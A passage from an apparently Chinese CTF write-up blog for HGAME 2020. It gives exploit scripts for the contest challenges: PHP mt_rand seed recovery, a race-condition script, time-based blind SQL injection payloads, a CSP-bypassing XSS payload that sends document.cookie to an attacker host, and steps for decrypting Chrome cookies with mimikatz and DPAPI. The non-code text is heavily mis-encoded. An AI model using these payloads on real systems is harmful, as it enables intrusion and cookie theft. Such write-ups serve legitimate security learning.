test_do_undo(</span><br><span class="line">        php_mt_initialize,</span><br><span class="line">        <span class="keyword">lambda</span> s: undo_php_mt_initialize(s[<span class="number">227</span>], <span class="number">227</span>)</span><br><span class="line">    )</span><br><span class="line">    test_do_undo(</span><br><span class="line">        php_mt_rand,</span><br><span class="line">        undo_php_mt_rand</span><br><span class="line">    )</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://twoshot.hgame.n3ko.co/&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line">r = req.get(url+<span class="string">&quot;random.php?times=228&quot;</span>)</span><br><span class="line"><span class="comment"># print(r.content)</span></span><br><span class="line">data = json.loads(r.text)</span><br><span class="line">seed = main(data[<span class="number">0</span>], data[len(data)<span class="number">-1</span>], <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">r = req.post(url+<span class="string">&quot;verify.php&quot;</span>, data=&#123;<span class="string">&quot;ans&quot;</span>:seed&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>expä¸­çš„mainå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æŸä¸ªéšæœºæ•°çš„å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸è¿™ä¸ªéšæœºæ•°ç›¸éš”226ä¸ªéšæœºæ•°çš„éšæœºæ•°çš„å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¿™ä¸ªéšæœºæ•°å‰é¢éšæœºæ•°çš„ä¸ªæ•°ï¼Œç¬¬å››ä¸ªå‚æ•°æ˜¯phpçš„ç‰ˆæœ¬ï¼Œ0ä»£è¡¨php5ï¼Œ1ä»£è¡¨php7</p><h4 id="Cosmosçš„äºŒæ‰‹å¸‚åœº"><a href="#Cosmosçš„äºŒæ‰‹å¸‚åœº" class="headerlink" title="Cosmosçš„äºŒæ‰‹å¸‚åœº"></a>Cosmosçš„äºŒæ‰‹å¸‚åœº</h4><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ¡ä»¶ç«äº‰ï¼ŒçœŸæ²¡æƒ³åˆ°,expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span>(<span class="params">i,data</span>):</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">url=<span class="string">&quot;&#123;&#125;?method=solve&quot;</span>.format(host)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">url=<span class="string">&quot;&#123;&#125;?method=buy&quot;</span>.format(host)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.post(url=url,data=data)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;è¯·æ±‚å¤±è´¥&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://121.36.88.65:9999/API/&quot;</span></span><br><span class="line">user=&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>:<span class="string">&quot;roc&quot;</span>,</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">s=requests.session()</span><br><span class="line">s.post(url=<span class="string">&quot;&#123;&#125;?method=login&quot;</span>.format(host),data=user)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>:<span class="string">&#x27;800001&#x27;</span>,</span><br><span class="line"><span class="string">&quot;amount&quot;</span>:<span class="string">&#x27;500&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">info=json.loads(s.get(<span class="string">&quot;&#123;&#125;?method=getinfo&quot;</span>.format(host)).text)</span><br><span class="line">money=info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;money&#x27;</span>]</span><br><span class="line">properties=info[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;properties&#x27;</span>]</span><br><span class="line">print(money)</span><br><span class="line">print(properties)</span><br><span class="line"><span class="keyword">if</span> money&gt;<span class="number">100000000</span>:</span><br><span class="line">print(s.get(<span class="string">&quot;&#123;&#125;?method=getflag&quot;</span>.format(host)).text)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">amount=int(properties[<span class="number">0</span>][<span class="string">&#x27;amount&#x27;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">amount=money//<span class="number">10000</span></span><br><span class="line"><span class="keyword">if</span> amount&gt;<span class="number">500</span>:</span><br><span class="line">amount=<span class="number">500</span></span><br><span class="line">data[<span class="string">&#x27;amount&#x27;</span>]=amount</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">t=threading.Thread(target=worker,args=(i,data))</span><br><span class="line">t.start()</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">i+=<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="Cosmosçš„ç•™è¨€æ¿-2"><a href="#Cosmosçš„ç•™è¨€æ¿-2" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-2"></a>Cosmosçš„ç•™è¨€æ¿-2</h4><p>æŒ‰ç…§ç•™è¨€æ¿1ï¼ŒçŒœæµ‹è¿™é¢˜å°±æ˜¯sqlæ³¨å…¥ï¼Œæœ€ååœ¨åˆ é™¤çš„ä½ç½®å­˜åœ¨ç›²æ³¨</p><p>ç›´æ¥ç”¨sqlmapè·‘å‡ºæ¥äº†ğŸ˜‚</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200204204426.png" style="zoom:80%;"><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">method=<span class="keyword">delete</span>&amp;delete_id=(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">5147</span>=<span class="number">5147</span>) <span class="keyword">THEN</span> <span class="keyword">SLEEP</span>(<span class="number">5</span>) <span class="keyword">ELSE</span> <span class="number">5147</span> <span class="keyword">END</span>)</span><br><span class="line">ä¸¾ä¸ªä¾‹å­ï¼š</span><br><span class="line">(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">name</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>) <span class="keyword">FROM</span> babysql.<span class="string">`user`</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>,<span class="number">1</span>))&gt;<span class="number">47</span>) <span class="keyword">THEN</span> <span class="keyword">SLEEP</span>(<span class="number">4</span>) <span class="keyword">ELSE</span> <span class="number">6131</span> <span class="keyword">END</span>)</span><br></pre></td></tr></table></figure><h4 id="Cosmosçš„èŠå¤©å®¤2-0"><a href="#Cosmosçš„èŠå¤©å®¤2-0" class="headerlink" title="Cosmosçš„èŠå¤©å®¤2.0"></a>Cosmosçš„èŠå¤©å®¤2.0</h4><p>è¿™é“é¢˜è¯•äº†å¥½ä¹…ï¼Œåæ¥æ‰å‘ç°æœ‰CSP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure><p>å®ƒé™åˆ¶äº†å†…è” JS è„šæœ¬ï¼Œå¹¶ä¸”é™åˆ¶äº†å¼•â¼Šçš„é™æ€èµ„æºâ½‚ä»¶åªèƒ½ä»åŒåŸŸä¸‹åŠ è½½ã€‚åœ¨å®é™…åº”â½¤ä¸­ï¼Œé‡åˆ°è¿™ç§CSPâ¼€èˆ¬æ˜¯æ‰¾è¯¥ç«™æ˜¯å¦æœ‰â½‚ä»¶ä¸Šä¼ ç‚¹ï¼Œä¹Ÿå¯ä»¥åŒæºä¸‹æœ‰æ²¡æœ‰å¯ä»¥æ‰§â¾ä»»æ„ JS ä»£ç çš„ evil.js â½‚ä»¶</p><p>é¢˜ç›®çš„è¿‡æ»¤å¾ˆç®€å•ï¼ŒåŒå†™å°±å¯ä»¥ç»•è¿‡ï¼Œé¢˜ç›®æœ‰ä¸ªæ¥â¼<code>/send</code>ï¼Œå®ƒä¼šè¿”å›è¿‡æ»¤åçš„æ¶ˆæ¯å†…å®¹ï¼Œå¹¶ä¸”æ˜¯GETè¯·æ±‚æ–¹å¼ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ ä¸‹é¢çš„payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scriscriptpt</span> <span class="attr">src</span>=<span class="string">&quot;/send?message=window.open(&#x27;http://yourvps/?&#x27;%2bdocument.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„<code>+</code>å·è¦urlç¼–ç ä¸º<code>%2b</code></p><h3 id="misc-2"><a href="#misc-2" class="headerlink" title="misc"></a>misc</h3><h4 id="ç¾-äºº-é²¸"><a href="#ç¾-äºº-é²¸" class="headerlink" title="ç¾ äºº é²¸"></a>ç¾ äºº é²¸</h4><p>è¿™é¢˜æ˜¯ä¸ªdockeré•œåƒï¼Œå…ˆpullä¸‹æ¥</p><p>ç„¶åè¿è¡Œå¹¶è¿›å…¥å®¹å™¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -i 31ab18768617 /bin/sh</span><br></pre></td></tr></table></figure><p>æœç´¢ä¸€ä¸‹æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag*</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°<code>/usr/share/man/man8/flag.tar.gz</code>ï¼Œå…ˆæ‹·è´å‡ºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp ba61f2585d31:/usr/share/man/man8/flag.tar.gz /home/ubuntu/Desktop/<span class="comment">#å­—ç¬¦ä¸²ä¸ºå®¹å™¨id</span></span><br></pre></td></tr></table></figure><p>è§£å‹å‘ç°<code>README</code>é‡Œæœ‰<code>See sh history.</code>ï¼Œå†è¿›å…¥å®¹å™¨</p><p>å‘ç°å†<code>/root</code>ç›®å½•ä¸‹æœ‰<code>.ash_history</code>æ–‡ä»¶</p><p>é‡Œé¢æœ‰<code>echo -e &quot;Zip password is somewhere else in /etc.\nFind it!&quot;</code> </p><p>æç¤ºæˆ‘ä»¬zipå¯†ç å†<code>/etc</code>ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn <span class="string">&quot;Zip&quot;</span> /etc</span><br></pre></td></tr></table></figure><p>-ræ˜¯é€’å½’æ–¹å¼æŸ¥æ‰¾ç›®å½•ï¼Œ-næ˜¾ç¤ºè¡Œå·</p><p>åœ¨issueæ–‡ä»¶æ‰¾åˆ°zipå¯†ç ï¼Œ<code>Zip Password: cfuzQ3Gd6gqKG@$N</code></p><p>è§£å‹å¾—åˆ°<code>flag.db</code>ï¼Œç›´æ¥è®°äº‹æœ¬æˆ–è€…NavicatæŸ¥çœ‹å¾—åˆ°flag</p><h4 id="ä¸‰é‡éšå†™"><a href="#ä¸‰é‡éšå†™" class="headerlink" title="ä¸‰é‡éšå†™"></a>ä¸‰é‡éšå†™</h4><p>è§£å‹é™„ä»¶ï¼Œ<code>You know LSB.wav</code>ï¼ŒçŒœæµ‹wavçš„lsbéšå†™ï¼Œå¯ä»¥ç›´æ¥ç”¨å·¥å…·<strong>SilentEye</strong></p><p>ä¸‹è½½é“¾æ¥ï¼š<a href="https://silenteye.v1kings.io/download.html?i2">https://silenteye.v1kings.io/download.html?i2</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200203230927.png" style="zoom:80%;"><p>å¾—åˆ°ï¼š<code>Stegano key: uFSARLVNwVIewCY5</code></p><p>è¯•äº†è¯•ï¼Œå‘ç°<code>ä¸Šè£ä¸æ‰‹æŠ„å·.mp3</code>æ˜¯MP3Stegoéšå†™ï¼Œå¯†ç æ˜¯æˆ‘ä»¬ä¹‹é—´å¾—åˆ°çš„</p><p>å¾—åˆ°ï¼š<code>Zip Password: VvLvmGjpJ75GdJDP</code></p><p>è§£å‹å‹ç¼©åŒ…å¾—åˆ°<code>flag.crypto</code>ï¼Œå®‰è£…é™„ä»¶ä¸­çš„å·¥å…·ï¼Œå‘ç°éœ€è¦å¯†ç </p><p>å¯¹äº<code>Unlasting.mp3</code>ï¼Œä½¿ç”¨foremoståˆ†ç¦»å‡ºä¸€å¼ pngå›¾ç‰‡ï¼Œbinwalkå¥½åƒåˆ†ç¦»ä¸å‡ºæ¥</p><p>æ˜¯Pdf417çš„äºŒç»´ç æ‰«ç ï¼Œåœ¨çº¿ç½‘å€ï¼š<a href="https://online-barcode-reader.inliteresearch.com/[](https://online-barcode-reader.inliteresearch.com/)">https://online-barcode-reader.inliteresearch.com/[](https://online-barcode-reader.inliteresearch.com/)</a></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200204102453.png" style="zoom:80%;"><p>ç”¨<code>EncryptoforWin.exe</code>è¾“å…¥å¯†ç è§£å¯†å³å¯å¾—flag</p><h4 id="æ—¥å¸¸"><a href="#æ—¥å¸¸" class="headerlink" title="æ—¥å¸¸"></a>æ—¥å¸¸</h4><p>ä¸‰ä¸ªæ–‡ä»¶ï¼Œ<code>Blind.png</code>ï¼Œ<code>Origin_pixivArtwork75992170.png</code>ï¼Œ<code>æ©«è±æ’‡é»æŠ˜_av85002656.ogg</code></p><p>ä¸¤å¼ å›¾ç‰‡ç›¸åŒï¼ŒçŒœæµ‹æ˜¯ç›²æ°´å°ï¼Œç›´æ¥ç”¨<code>bwm</code>ï¼Œåœ°å€ï¼š<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwm.py decode Blind.png Origin_pixivArtwork75992170.png flag.png</span><br></pre></td></tr></table></figure><p>å¥½åƒçœ‹ä¸å¤ªæ¸…ï¼Œç”¨<code>StegSolve</code>åˆ‡æ¢ä¸€ä¸‹</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200204113634.png" style="zoom: 200%;"><p>å†…å®¹ä¸ºï¼š<code>VeraCrypt Password is X0YA1GDuZF$echCy</code></p><p><code>æ©«è±æ’‡é»æŠ˜_av85002656.ogg</code>binwalkåˆ†ç¦»å‡ºä¸€ä¸ª<code>Container</code>æ–‡ä»¶ï¼Œç”¨<code>VeraCrypt</code>è§£å¯†</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200204125357.png" style="zoom:80%;"><p>ç„¶åå‘ç°æœ‰ä¸‰ä¸ªæ–‡ä»¶</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205155637.png" style="zoom:80%;"><p>å’Œ3ctfæµé‡åˆ†æé¢˜ç›¸ä¼¼ï¼Œå‚è€ƒï¼š<a href="http://www.gtfly.top/2019/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1-%E5%86%B0%E8%9D%8E-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.[html](http://www.gtfly.top/2019/11/18/%E8%AE%B0%E4%B8%80%E6%AC%A1-%E5%86%B0%E8%9D%8E-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.html)">http://www.gtfly.top/2019/11/18/è®°ä¸€æ¬¡-å†°è-ä¸€å¥è¯æœ¨é©¬æµé‡åˆ†æ.[html](http://www.gtfly.top/2019/11/18/è®°ä¸€æ¬¡-å†°è-ä¸€å¥è¯æœ¨é©¬æµé‡åˆ†æ.html)</a></p><p><code>Cookies</code>æ–‡ä»¶æ˜¯ä»Chromeæµè§ˆå™¨å¯¼å‡ºçš„æ–‡ä»¶ï¼Œåœ¨ä¿å­˜æ—¶ï¼ŒChromeå…ˆå°†å¯†ç è¿›è¡ŒDPAPIåŠ å¯†ï¼Œå†ä¿å­˜åœ¨SQLiteæ•°æ®åº“æ–‡ä»¶ä¸­ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªSQLiteæ•°æ®åº“æ–‡ä»¶</p><p>å†ä»‹ç»å‡ ä¸ªæ¦‚å¿µï¼š</p><p>chrome33ä»¥ä¸Šå¯¹Cookiesè¿›è¡Œäº†åŠ å¯†ï¼Œvalueå˜ä¸ºç©ºï¼Œå¢åŠ äº†åŠ å¯†çš„<strong>encrypted_value</strong>å­—æ®µï¼Œå­—æ®µç±»å‹æ˜¯<strong>BLOB</strong>ï¼Œè¿™ä¸ªä¾¿æ˜¯æˆ‘ä»¬éœ€è¦è§£å¯†çš„å†…å®¹</p><p><strong>Master Keyï¼š</strong></p><p>64å­—èŠ‚ï¼Œç”¨äºè§£å¯†DPAPI BLOB</p><p>é€šè¿‡ç”¨æˆ·ç™»å½•å¯†ç ã€SIDå’Œ16å­—èŠ‚éšæœºæ•°åŠ å¯†åä¿å­˜åœ¨Master Key fileä¸­</p><p><strong>Master Key fileï¼š</strong></p><p>äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç å¯¹å…¶è§£å¯†ï¼Œè·å¾—Master Key</p><p><strong>SIDï¼ˆSecurity Identifiersï¼ŒSIDï¼‰ï¼š</strong></p><p>å®‰å…¨æ ‡è¯†ç¬¦ï¼Œæ˜¯æ ‡è¯†ç”¨æˆ·ã€ç»„å’Œè®¡ç®—æœºå¸æˆ·çš„å”¯ä¸€çš„å·ç ã€‚åœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºè¯¥å¸æˆ·æ—¶ï¼Œå°†ç»™ç½‘ç»œä¸Šçš„æ¯ä¸€ä¸ªå¸æˆ·å‘å¸ƒä¸€ä¸ªå”¯ä¸€çš„ SIDã€‚Windows 2000 ä¸­çš„å†…éƒ¨è¿›ç¨‹å°†å¼•ç”¨å¸æˆ·çš„ SID è€Œä¸æ˜¯å¸æˆ·çš„ç”¨æˆ·æˆ–ç»„åã€‚å¦‚æœåˆ›å»ºå¸æˆ·ï¼Œå†åˆ é™¤å¸æˆ·ï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„ç”¨æˆ·ååˆ›å»ºå¦ä¸€ä¸ªå¸æˆ·ï¼Œåˆ™æ–°å¸æˆ·å°†ä¸å…·æœ‰æˆæƒç»™å‰ä¸€ä¸ªå¸æˆ·çš„æƒåŠ›æˆ–æƒé™ï¼ŒåŸå› æ˜¯è¯¥å¸æˆ·å…·æœ‰ä¸åŒçš„ SID å·ã€‚</p><p><code>ObjectNF-PC.txt</code>æ˜¯<code>mimikatz</code>å¯¼å‡ºçš„ç»“æœï¼Œå¯†ç æˆ‘ä»¬èƒ½è§£å‡ºæ¥</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205163047.png" style="zoom:80%;"><p>æˆ‘ä»¬ç°åœ¨å…ˆå¯¼å‡º<code>BLOB</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205163525.png" style="zoom: 67%;"><p>ç„¶åç”¨<code>Windows Password Recovery</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205163733.png" style="zoom: 67%;"><p>é€‰æ‹©å¯¼å‡ºè¦è§£å¯†çš„<code>BLOB</code></p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205163846.png" style="zoom: 67%;"><p>é€‰æ‹©<code>Master Key file</code>ï¼Œå³<code>S-1-5-21-3375469711-1363829938-1291733684-1001.zip</code>å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¥½åƒæ²¡æ³•åœ¨æ–‡ä»¶å¤¹é‡Œæ˜¾ç¤ºï¼Œåªéœ€å¤åˆ¶æ–‡ä»¶åï¼Œä¼šè‡ªåŠ¨åŒ¹é…æ–‡ä»¶</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205164105.png" style="zoom:67%;"><p>å¡«å†™SIDå’Œå¯†ç </p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205164405.png" style="zoom:67%;"><p>å¾—åˆ°flag</p><img src="/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/TIMæˆªå›¾20200205164456.png" style="zoom:67%;"><h4 id="æ™ºæ¢°å±æœºï¼ˆ-1"><a href="#æ™ºæ¢°å±æœºï¼ˆ-1" class="headerlink" title="æ™ºæ¢°å±æœºï¼ˆ#1)"></a>æ™ºæ¢°å±æœºï¼ˆ#1)</h4><p>æœåŠ¡ç«¯ç¨‹åºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">true_flag = <span class="string">&#x27;hgame&#123;&#125;&#x27;</span></span><br><span class="line">flag = np.loadtxt(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">0.18</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mse</span>(<span class="params">true, predict</span>):</span></span><br><span class="line">    <span class="keyword">return</span> np.average(np.abs(true - predict))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">predict</span>):</span></span><br><span class="line">    <span class="keyword">if</span> mse(flag, predict) &lt; threshold:</span><br><span class="line">        print(true_flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Unfortunately! Your mse loss is over the threshold, try again!&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;Wrong flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    print(<span class="string">&quot;Welcome to this game!&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Please input your flag here (separated by space please):&quot;</span>)</span><br><span class="line">    inp=input()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        inp = np.asarray(inp.split(<span class="string">&#x27; &#x27;</span>), dtype=float)</span><br><span class="line">        judge(inp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;Internal Error!&quot;</span>)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> keras.models <span class="keyword">as</span> models</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">model = models.load_model(<span class="string">&#x27;flag.hdf5&#x27;</span>)</span><br><span class="line"><span class="comment"># model.summary()</span></span><br><span class="line">weights = model.get_layer(index=<span class="number">1</span>).get_weights()</span><br><span class="line">W = weights[<span class="number">0</span>]</span><br><span class="line">b = weights[<span class="number">1</span>]</span><br><span class="line">y = np.loadtxt(<span class="string">&#x27;enc_flag.txt&#x27;</span>)</span><br><span class="line">W_data = tf.placeholder(tf.float32, [<span class="number">128</span>, <span class="number">64</span>])</span><br><span class="line">target = tf.placeholder(tf.float32, [<span class="number">64</span>])</span><br><span class="line">X_op = tf.Variable(tf.truncated_normal([<span class="number">1</span>, <span class="number">128</span>]))</span><br><span class="line">pred = tf.matmul(tf.sigmoid(X_op), W_data)</span><br><span class="line">loss = tf.reduce_mean(tf.abs(target - pred))</span><br><span class="line">optimizer = tf.train.AdamOptimizer(learning_rate=<span class="number">1e-3</span>)</span><br><span class="line">train_op = optimizer.minimize(loss)</span><br><span class="line"><span class="keyword">with</span> tf.Session() <span class="keyword">as</span> sess:</span><br><span class="line">sess.run(tf.global_variables_initializer())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">_, loss_value = sess.run([train_op, loss],feed_dict=&#123;W_data: W, target: y - b&#125;)</span><br><span class="line"><span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">print(i, loss_value)</span><br><span class="line">result = np.array(sess.run(X_op))</span><br><span class="line">result[result &gt; <span class="number">0.5</span>] = <span class="number">1</span></span><br><span class="line">result[result &lt; <span class="number">0.5</span>] = <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ"><a href="#ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ" class="headerlink" title="ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ"></a>ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ</h4><p>ä¸éš¾å‘ç°æ˜¯XXE</p><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 